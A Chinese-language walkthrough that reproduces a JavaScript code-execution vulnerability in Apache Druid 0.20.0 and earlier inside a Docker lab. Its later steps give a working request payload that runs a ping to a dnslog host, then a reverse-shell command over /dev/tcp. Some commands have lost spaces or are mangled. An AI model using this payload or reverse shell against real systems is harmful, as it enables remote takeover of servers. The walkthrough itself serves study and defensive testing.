ApacheDruid是一个专为大数据集的快速切片分析（OLAP查询）而设计的实时分析数据库。Druid作为数据库，最常用于支持以下用例：实时摄取、快速查询和高运行时长。


例如，Druid一般用于支持分析型应用程序的GUI，或是需要快速聚合的高并发API后台。Druid最适合用于面向事件的数据。

漏洞简介



Apache Druid能够执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码，此功能默认情况下已被禁用。但在Druid0.20.0及更低版本中，身份认证成功的用户可以通过发送恶意请求来利用Apache Druid漏洞执行任意代码。

漏洞环境搭建



1、可通过docker搭建漏洞环境，执行以下命令拉取docker漏洞环境镜像

docker pull fokkodriesprong/docker-druid



2、执行以下命令在后台启动容器，并将容器的8888端口映射到宿主机的8888端口

dockerrun  --rm -it  -d  -p8888:8888 fokkodriesprong/docker-druid /bin/bash




3、访问宿主机IP+8888端口出现以下界面即代表环境搭建成功。

漏洞复现



1、点击Load data进入新界面后，再点击local disk按钮。



2、进入新界面后，在标红框的Base directory栏写上quickstart/tutorial/，File filter栏写上wikiticker-2015-09-12-sampled.json.gz，写好后点击Preview，再点击Next



3、一直点击Next按钮，直到按钮文字为Next：Filter停止



4、点击Next：Filter按钮，利用Burpsuite抓取该数据包，数据包如下



5、将transformSpec值修改为以下内容，其中x30ofp.dnslog.cn为dnslog地址

"transforms":[],"filter":{"type":"javascript","function":"function(value){returnjava.lang.Runtime.getRuntime().exec('ping x30ofp.dnslog.cn')}","dimension":"added","":{"enabled":"true"}}



6、发送该数据包，DNSLOG有回显即说明漏洞复现成功



7、将pingx30ofp.dnslog.cn替换成反弹shell命令/bin/bash -c $@|bash 0echo bash -i >& /dev/tcp/ip/port 0>&1，即可进行反弹shell
